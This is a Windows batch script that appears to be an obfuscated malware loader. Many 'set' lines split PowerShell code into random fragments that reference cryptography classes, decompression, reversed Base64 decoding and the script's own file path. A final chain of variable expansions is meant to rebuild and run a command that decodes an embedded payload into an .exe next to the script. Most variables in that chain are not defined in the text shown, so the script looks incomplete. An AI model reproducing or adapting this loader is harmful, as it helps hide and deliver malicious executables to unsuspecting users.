@echo off
set "juDSbZGhMQ=TxCb"
set "kyiwSGnRLY=]::("
set "WyCOELdBnP=cbnj"
set "dRJlXGkyNC=New-"
set "RufuoJSmhH=;$KD"
set "YygmPEEQoY=oryS"
set "zYQpWopVkB=] -j"
set "qTPTEMojbL=yste"
set "Bfitjspnjw=stem"
set "yRPkJBVyRd=ateD"
set "PYutfZWvgh=16] "
set "HGJkwwnPkU=jM.I"
set "SmlBjFMdAu=bnjM"
set "olVAzdMRJn=eNI."
set "DuHbIEnLJE=ne);"
set "sHBECAYndB=fxMb"
set "bSUFOAUdul=gth)"
set "ksYXHojxuI=tem."
set "RySAOAADjD=ress"
set "nnDKITcidi=nage"
set "jbBRYQsHUg=mory"
set "bRaOobZIyJ=ress"
set "eoCmHksnou=eNI "
set "uauZEveFCh=tryP"
set "VNfLxKPOXR=ZYYc"
set "nwFwCKZjWH=ewLi"
set "iGSPupdBlj=comp"
set "okoEwAboTa=Fo7l"
set "vutXzUxSuK=y.Cr"
set "dGzBLdnSpp='[-1"
set "vuEQNoSFxZ=fsx."
set "jckXPipRql=ss -"
set "MMVSAETBhm=B, 0"
set "jYWLVcLDvE=.Cop"
set "OIjzKwfyLA=Y = "
set "cQfNFlSQgE=Bmor"
set "hKKWMQfUvu=S.En"
set "WMQYPiaEUu=ypto"
set "yBrkTrbTSp=grap"
set "pHgxZZDVqV=Iy ="
set "wsPgNNIMrA=ct S"
set "asIMjUIhXr=);$T"
set "zKXfrEfeAq=.Cry"
set "ltzpIrSKYX=.Key"
set "UwluUsbXym=:: '"
set "SEaeiFjkRl=d;$c"
set "NPecRIDGxF=yste"
set "mnRuyLEvpN=, (,"
set "cPqRTRICDU=Comp"
set "HhatpnUbvo=$Bdf"
set "ffMDFREsuH=t Sy"
set "eiHsyRXtvh=ose("
set "oTldgFONDT=B = "
set "xaxAcoNSXm=.Mod"
set "edBlLGzUdL=v4Ir"
set "BudzViADhI=e = "
set "UCnjTirGis='txe"
set "vVIXRBQsWF=.Cre"
set "WNkAuZDShl=3HWs"
set "kyydxvfzuD=).Sp"
set "FfVMThTDLG=('da"
set "nrjinrjyWq=xMbB"
set "JWuuAWkzqX=.Com"
set "CtpGcVDhhu=orF'"
set "UBWbzvCMEi=;$Bd"
set "GXSkKINqoU= [Sy"
set "xHabbONCqQ=bstr"
set "ZQbETrBjWE=('%~f0'"
set "qYDceyivjp=F'[-"
set "WdbiEXHQos=g = "
set "wYgQZzLnCc=brea"
set "dGwZekgSLR=nPBR"
set "BMobvPOuft=eRbA"
set "CyEAPAisFM=ay()"
set "gOZiWfIHRJ=pose"
set "jeMszNpRye=$TxC"
set "LHSeXXeQBC=esaB"
set "CNunYqbJCy=nirt"
set "zatHpmEiCG=m.IO"
set "bfWrcEVVgH=ispo"
set "ASyiYPIEhI=$nlm"
set "xKzMcgcDvW=-joi"
set "XeStOWOnse=pose"
set "iRNozZMbHE=I.Su"
set "gLTCYMwsBG=[Sys"
set "jMZgEPpNOM=fxMb"
set "OJYkAoSyeg=urit"
set "BRseorDPRV= [st"
%ipbaNzZyEo%%pnqSvUleCH%%EzlkbYxXzO%%YNCWMXjlUY%%UYYNJwmNMY%%yimUmJeQYO%%cbZPqBKtfy%%KZjENGByBF%%MKlAqPBIKc%%TsnfVSZiwh%%LSHnoyYHgF%%iGpscsQzzB%%acJdFrMeJU%%HsbtUTcXlS%%QUCeUndUdD%%czJVhJjEIX%%LUYmYPEVyj%%pSnGKfAEir%%nSafRhJgmk%%JyoogVVpge%%IivTnkmckb%%jFvqJTUSuR%%gxInzRDYAP%%kkydJfxgRH%%UGWlbdcYFn%%bdVoYkzhtw%%GoCuRZhrHD%%vNaMWzBxmw%%PFtnNgojfy%%GpNvaGeBuc%%WKqbRocisy%%JbVXGbVoHK%%KXmjXgaFLq%"%~dp0%~nx0.exe"
cls
%JQDgFJqmmg%%WMdOSTNKad%
